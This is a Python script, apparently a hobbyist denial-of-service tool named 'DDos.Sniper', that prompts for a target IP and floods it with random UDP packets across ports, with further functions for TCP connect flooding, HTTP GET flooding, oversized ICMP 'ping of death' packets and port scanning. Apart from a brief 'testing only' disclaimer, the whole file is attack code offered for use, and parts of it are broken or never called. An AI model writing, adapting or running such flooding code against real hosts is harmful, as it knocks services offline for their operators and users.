#Lets import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
import colorama
from colorama import Fore, Back, Style

#Lets start coding
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Initialize colorama library
colorama.init(autoreset=True)

#Lets define sock and bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Clean screen in a way compatible with the operating system
if os.name == "nt":
    os.system("cls")
else:
    os.system("clear")

# Animated loading banner
def animated_banner():
    # Clean screen
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
        
    banner = Fore.RED + '''
    ************************************************
    *                                              *
    *       ██████╗ ██████╗  ██████╗ ███████╗      *
    *       ██╔══██╗██╔══██╗██╔═══██╗██╔════╝      *
    *       ██║  ██║██║  ██║██║   ██║███████╗      *
    *       ██║  ██║██║  ██║██║   ██║╚════██║      *
    *       ██████╔╝██████╔╝╚██████╔╝███████║      *
    *       ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      *
    *                                              *
    *              ███████╗███╗   ██╗              *
    *              ██╔════╝████╗  ██║              *
    *              ███████╗██╔██╗ ██║              *
    *              ╚════██║██║╚██╗██║              *
    *              ███████║██║ ╚████║              *
    *              ╚══════╝╚═╝  ╚═══╝              *
    *                                              *
    *            ██╗██████╗ ███████╗██████╗        *
    *            ██║██╔══██╗██╔════╝██╔══██╗       *
    *            ██║██████╔╝█████╗  ██████╔╝       *
    *            ██║██╔═══╝ ██╔══╝  ██╔══██╗       *
    *            ██║██║     ███████╗██║  ██║       *
    *            ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝       *''' + Fore.CYAN + '''
    *                                              *
    *          Author: Sami Khatatba                *
    *                                              *''' + Fore.YELLOW + '''
    ************************************************
    ************************************************''' + Fore.RED + '''
    *                                              *    
    *  [!] Disclaimer :                            *
    *  1. Don't Use For Personal Revenges          *
    *  2. Author Is Not Responsible For Your Jobs  *
    *  3. Use for learning purposes                * 
    *  4. Use responsibly for testing only         *''' + Fore.YELLOW + '''
    ************************************************
	'''
    
    print(banner)
    
    # Animated loading line
    loading_chars = ["[■□□□□□□□□□]", "[■■□□□□□□]", "[■■■□□□□□□]", "[■■■■□□□□□□]", 
                    "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", 
                    "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
    
    loading_messages = [
        "Initializing DDos.Sniper...",
        "Loading attack modules...",
        "Preparing network interfaces...",
        "Setting up targeting system...",
        "Calibrating attack parameters...",
        "Ready to engage target..."
    ]
    
    # Display animated loading line with changing messages
    for i in range(24):  # 4 seconds with 6 updates per second
        idx = i % len(loading_chars)
        msg_idx = min(i // 4, len(loading_messages) - 1)
        sys.stdout.write("\r" + Fore.GREEN + f"{loading_messages[msg_idx]} " + Fore.CYAN + f"{loading_chars[idx]}")
        sys.stdout.flush()
        time.sleep(1/6)  # Update 6 times per second
    
    print("\n" + Fore.GREEN + "DDos.Sniper loaded successfully!" + Fore.RESET)
    time.sleep(0.5)

# Run animated banner before showing the menu
animated_banner()

#Banner :
def show_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.RED + '''
    ************************************************
    *                                              *
    *       ██████╗ ██████╗  ██████╗ ███████╗      *
    *       ██╔══██╗██╔══██╗██╔═══██╗██╔════╝      *
    *       ██║  ██║██║  ██║██║   ██║███████╗      *
    *       ██║  ██║██║  ██║██║   ██║╚════██║      *
    *       ██████╔╝██████╔╝╚██████╔╝███████║      *
    *       ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      *
    *                                              *
    *              ███████╗███╗   ██╗              *
    *              ██╔════╝████╗  ██║              *
    *              ███████╗██╔██╗ ██║              *
    *              ╚════██║██║╚██╗██║              *
    *              ███████║██║ ╚████║              *
    *              ╚══════╝╚═╝  ╚═══╝              *
    *                                              *
    *            ██╗██████╗ ███████╗██████╗        *
    *            ██║██╔══██╗██╔════╝██╔══██╗       *
    *            ██║██████╔╝█████╗  ██████╔╝       *
    *            ██║██╔═══╝ ██╔══╝  ██╔══██╗       *
    *            ██║██║     ███████╗██║  ██║       *
    *            ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝       *''' + Fore.CYAN + '''
    *                                              *
    *          Author: Sami Khatatba                *
    *                                              *''' + Fore.YELLOW + '''
    ************************************************
    ************************************************''' + Fore.RED + '''
    *                                              *    
    *  [!] Disclaimer :                            *
    *  1. Don't Use For Personal Revenges          *
    *  2. Author Is Not Responsible For Your Jobs  *
    *  3. Use for learning purposes                * 
    *  4. Use responsibly for testing only         *''' + Fore.YELLOW + '''
    ************************************************
	''')

# Display current time information
print(Fore.CYAN + f"[*] Execution Date: {day}/{month}/{year} - {hour}:{minute}")
print(Fore.CYAN + f"[*] Operating System: {os.name}")
print()

# Add multiple attack options
print(Fore.GREEN + "Choose attack type:")
print(Fore.WHITE + "[1] Standard UDP Attack")
print(Fore.WHITE + "[2] Intensive UDP Attack (Multi-threaded)")
print(Fore.WHITE + "[3] TCP SYN Flood Attack")
print(Fore.WHITE + "[4] HTTP Flood Attack")
print(Fore.WHITE + "[5] Ping of Death Attack")
attack_type = input(Fore.YELLOW + "Your choice [1-5]: ")

# Add option to specify number of threads
threads_count = 1
if attack_type == "2":
    try:
        threads_count = int(input(Fore.YELLOW + "Number of threads [1-50]: "))
        if threads_count > 50:
            print(Fore.RED + "Maximum limit set to 50 threads")
            threads_count = 50
    except:
        print(Fore.RED + "Invalid value, using 1 thread")
        threads_count = 1

#Type your ip and port number (find IP address using nslookup or any online website) 
ip = input(Fore.YELLOW + " [+] Enter target IP address: ")
port = 0
try:
    port = int(input(Fore.YELLOW + " [+] Enter starting port number: "))
except:
    print(Fore.RED + "Invalid value, using port 80")
    port = 80

# Add option for attack duration
use_duration = input(Fore.YELLOW + "Set attack duration? (y/n): ").lower() == 'y'
duration = 0
if use_duration:
    try:
        duration = int(input(Fore.YELLOW + "Enter attack duration in seconds: "))
        if duration <= 0:
            print(Fore.RED + "Invalid duration, attack will run until manually stopped")
            use_duration = False
    except:
        print(Fore.RED + "Invalid value, attack will run until manually stopped")
        use_duration = False

# Add option for packet size
custom_packet_size = input(Fore.YELLOW + "Use custom packet size? (y/n): ").lower() == 'y'
if custom_packet_size:
    try:
        packet_size = int(input(Fore.YELLOW + "Enter packet size (bytes) [64-65500]: "))
        if packet_size < 64 or packet_size > 65500:
            print(Fore.RED + "Invalid size, using default (1490 bytes)")
            bytes = random._urandom(1490)
        else:
            bytes = random._urandom(packet_size)
            print(Fore.GREEN + f"Using packet size of {packet_size} bytes")
    except:
        print(Fore.RED + "Invalid value, using default (1490 bytes)")

# Attack function
def attack():
    global sent
    while True:
        try:
            sock.sendto(bytes, (ip, port))
            sent += 1
            if port == 65534:
                port = 1
        except:
            pass

#Lets start our attack
print(" ")
print(Fore.CYAN + "    Initializing DDos.Sniper attack... ")
print(" " )
print(Fore.RED + f" [+] DDos.Sniper attacking server {ip} on port {port}")
print(Fore.YELLOW + f" [+] Attack type: {'Standard UDP Attack' if attack_type == '1' else 'Intensive UDP Attack'}")
if attack_type == "2":
    print(Fore.YELLOW + f" [+] Number of threads: {threads_count}")
print (" " )

# Countdown
for i in range(5, 0, -1):
    print(Fore.YELLOW + f"Attack will start in {i} seconds...", end="\r")
    time.sleep(1)

sent = 0
start_time = time.time()

# Create multiple threads for intensive attack
if attack_type == "2":
    for i in range(threads_count):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        thread.start()
        print(Fore.GREEN + f"[+] Thread {i+1} started")
    
    # Display statistics periodically
    try:
        while True:
            time.sleep(1)
            current_time = time.time()
            elapsed = current_time - start_time
            packets_per_second = sent / elapsed if elapsed > 0 else 0
            print(Fore.GREEN + f"[+] Sent {sent} packets | {packets_per_second:.2f} packets/sec | Elapsed time: {elapsed:.2f} seconds", end="\r")
    except KeyboardInterrupt:
        print(" ")
        print(Fore.RED + "\n [-] Ctrl+C Detected.........Exiting")
        print(Fore.RED + " [-] DDOS ATTACK STOPPED")
else:
    # Standard attack
    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent = sent + 1
            port = port + 1
            current_time = time.time()
            elapsed = current_time - start_time
            packets_per_second = sent / elapsed if elapsed > 0 else 0
            print(Fore.GREEN + f"[+] Sent {sent} packets to {ip} through port:{port} | {packets_per_second:.2f} packets/sec", end="\r")
            if port == 65534:
                port = 1
    except KeyboardInterrupt:
        print(" ")
        print(Fore.RED + "\n [-] Ctrl+C Detected.........Exiting")
        print(Fore.RED + " [-] DDOS ATTACK STOPPED")

print(Fore.YELLOW + f"[*] Attack Statistics:")
print(Fore.YELLOW + f"[*] Total packets sent: {sent}")
print(Fore.YELLOW + f"[*] Time elapsed: {time.time() - start_time:.2f} seconds")
print(Fore.YELLOW + f"[*] Average packets per second: {sent / (time.time() - start_time):.2f}")

input(Fore.CYAN + "Press Enter to exit")

# Add new attack functions
def tcp_syn_flood():
    global sent
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(bytes)
            s.close()
            sent += 1
        except:
            pass

def http_flood():
    global sent
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
            s.close()
            sent += 1
        except:
            pass

def ping_of_death():
    global sent
    while True:
        try:
            packet = scapy.IP(dst=ip)/scapy.ICMP()/("X"*60000)
            scapy.send(packet, verbose=0)
            sent += 1
        except:
            pass

# Add option to save attack report
def save_report():
    report_file = f"ddos_report_{ip}_{day}-{month}-{year}_{hour}-{minute}.txt"
    with open(report_file, "w") as f:
        f.write(f"DDos.Sniper Attack Report\n")
        f.write(f"========================\n\n")
        f.write(f"Target: {ip}:{port}\n")
        f.write(f"Attack Type: {'Standard UDP Attack' if attack_type == '1' else 'Intensive UDP Attack' if attack_type == '2' else 'TCP SYN Flood' if attack_type == '3' else 'HTTP Flood' if attack_type == '4' else 'Ping of Death'}\n")
        f.write(f"Date: {day}/{month}/{year} - {hour}:{minute}\n")
        f.write(f"Duration: {time.time() - start_time:.2f} seconds\n")
        f.write(f"Total Packets Sent: {sent}\n")
        f.write(f"Average Packets/Second: {sent / (time.time() - start_time):.2f}\n")
    print(Fore.GREEN + f"\n[+] Report saved to {report_file}")

# Add this at the end of the script
save_log = input(Fore.YELLOW + "Save attack report? (y/n): ").lower() == 'y'
if save_log:
    save_report()


def network_tools():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "\nNETWORK TOOLS:")
    print(Fore.WHITE + "[1] Port Scanner")
    print(Fore.WHITE + "[2] IP Lookup")
    print(Fore.WHITE + "[3] Ping Test")
    print(Fore.WHITE + "[4] Back to Main Menu")
    
    choice = input(Fore.YELLOW + "\nSelect a tool: ")
    
    if choice == "1":
        port_scanner()
    elif choice == "2":
        ip_lookup()
    elif choice == "3":
        ping_test()
    elif choice == "4":
        return
    else:
        print(Fore.RED + "\nInvalid option. Press Enter to continue...")
        input()
        network_tools()

def port_scanner():
    target = input(Fore.YELLOW + "\nEnter target IP: ")
    start_port = int(input(Fore.YELLOW + "Enter start port: "))
    end_port = int(input(Fore.YELLOW + "Enter end port: "))
    
    print(Fore.GREEN + f"\nScanning {target} from port {start_port} to {end_port}...")
    
    open_ports = []
    for port in range(start_port, end_port + 1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        result = s.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
            print(Fore.GREEN + f"Port {port}: Open")
        s.close()
    
    print(Fore.GREEN + f"\nScan complete. Found {len(open_ports)} open ports.")
    input(Fore.CYAN + "Press Enter to continue...")
    network_tools()

def validate_target(ip):
    try:
        # Check if IP is valid
        socket.inet_aton(ip)
        
        # Check if target is reachable
        print(Fore.YELLOW + f"Checking if {ip} is reachable...")
        response = os.system(f"ping -n 1 -w 1000 {ip} > nul")
        
        if response == 0:
            print(Fore.GREEN + f"Target {ip} is reachable!")
            return True
        else:
            print(Fore.RED + f"Warning: Target {ip} does not respond to ping.")
            confirm = input(Fore.YELLOW + "Continue anyway? (y/n): ").lower()
            return confirm == 'y'
    except:
        print(Fore.RED + f"Error: {ip} is not a valid IP address.")
        return False
